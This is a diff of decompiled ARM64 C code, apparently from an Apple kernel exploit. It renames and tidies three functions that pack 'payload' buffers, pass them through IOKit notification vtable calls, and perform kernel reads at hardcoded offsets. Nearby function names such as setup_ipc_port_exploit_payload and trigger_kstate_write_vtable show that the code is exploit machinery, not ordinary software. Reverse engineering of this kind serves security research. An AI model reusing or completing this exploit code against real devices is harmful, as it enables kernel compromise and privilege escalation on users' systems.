@@ -10363,22 +10363,12 @@ __int64 __fastcall setup_ipc_port_exploit_payload(__int64 a1, __int64 a2, int a3
 //----- (0000000000010DEC) ----------------------------------------------------
 __int64 __fastcall send_iokit_notification(__int64 a1, __int64 a2, uint64_t *a3)
 {
-  __int64 v3; // x8
-  uint64_t *v4; // x10
-  __int128 v7[14]; // [xsp+10h] [xbp-100h] BYREF
-  __int64 v8; // [xsp+F0h] [xbp-20h]
+  uint64_t payload[29]; // [xsp+10h] [xbp-100h] BYREF
 
-  v3 = 0;
-  v8 = 0;
-  memset(v7, 0, sizeof(v7));
-  do
-  {
-    v4 = a3++;
-    *(uint64_t *)((char *)v7 + v3) = *v4;
-    v3 += 8;
-  }
-  while ( v3 != 232 );
-  return (*(__int64 (__fastcall **)(__int64, __int64, __int64, __int128 *))(*(uint64_t *)a1 + 8LL))(a1, a2, 29, v7);
+  memset(payload, 0, sizeof(payload));
+  for ( __int64 i = 0; i != 29; ++i )
+    payload[i] = a3[i];
+  return (*(__int64 (__fastcall **)(__int64, __int64, __int64, uint64_t *))(*(uint64_t *)a1 + 8LL))(a1, a2, 29, payload);
 }
 
 //----- (0000000000010EA8) ----------------------------------------------------
@@ -10426,15 +10416,12 @@ __int64 __fastcall setup_notification_extra_args(__int64 a1, __int64 a2, __int64
 //----- (0000000000011054) ----------------------------------------------------
 __int64 __fastcall trigger_kstate_write_vtable(__int64 *a1, __int64 a2, __int64 a3)
 {
-  uint64_t v5[2]; // [xsp+8h] [xbp-48h] BYREF
-  __int128 v6; // [xsp+18h] [xbp-38h]
-  __int128 v7; // [xsp+28h] [xbp-28h]
+  uint64_t payload[6]; // [xsp+8h] [xbp-48h] BYREF
 
-  v5[0] = a1[83] + 61400;
-  v5[1] = a3;
-  v6 = 0u;
-  v7 = 0u;
-  (*(void (__fastcall **)(__int64 *, __int64, __int64, uint64_t *))(*a1 + 8))(a1, qword_48018, 6, v5);
+  memset(payload, 0, sizeof(payload));
+  payload[0] = a1[83] + 61400;
+  payload[1] = a3;
+  (*(void (__fastcall **)(__int64 *, __int64, __int64, uint64_t *))(*a1 + 8))(a1, qword_48018, 6, payload);
   return kread_u64_value(a1[1], a1[83] + 61696);
 }
 // 48018: using guessed type __int64 qword_48018;
@@ -10451,30 +10438,19 @@ __int64 __fastcall pack_exploit_args_buffer(
         __int64 a8,
         __int64 a9)
 {
-  __int64 v9; // x8
-  __int64 *v10; // x10
-  __int64 *v12; // [xsp+8h] [xbp-98h]
-  __int128 v13[7]; // [xsp+10h] [xbp-90h] BYREF
-  __int64 v14; // [xsp+80h] [xbp-20h]
-  __int64 v15; // [xsp+88h] [xbp-18h]
+  volatile __int64 *stackArgs; // [xsp+8h] [xbp-98h]
+  uint64_t payload[16]; // [xsp+10h] [xbp-90h] BYREF
 
-  v9 = 0;
-  v12 = &a9;
-  v14 = 0;
-  memset(v13, 0, sizeof(v13));
-  do
-  {
-    v10 = v12++;
-    *(uint64_t *)((char *)v13 + v9) = *v10;
-    v9 += 8;
-  }
-  while ( v9 != 64 );
-  v15 = a2;
-  return (*(__int64 (__fastcall **)(__int64, __int64, __int64, __int128 *))(*(uint64_t *)a1 + 8LL))(
+  stackArgs = (volatile __int64 *)((char *)__builtin_frame_address(0) + 16);
+  memset(payload, 0, sizeof(payload));
+  for ( __int64 i = 0; i != 8; ++i )
+    payload[i] = stackArgs[i];
+  payload[15] = a2;
+  return (*(__int64 (__fastcall **)(__int64, __int64, __int64, uint64_t *))(*(uint64_t *)a1 + 8LL))(
            a1,
            qword_48000,
            16,
-           v13);
+           payload);
 }
 // 48000: using guessed type __int64 qword_48000;
 
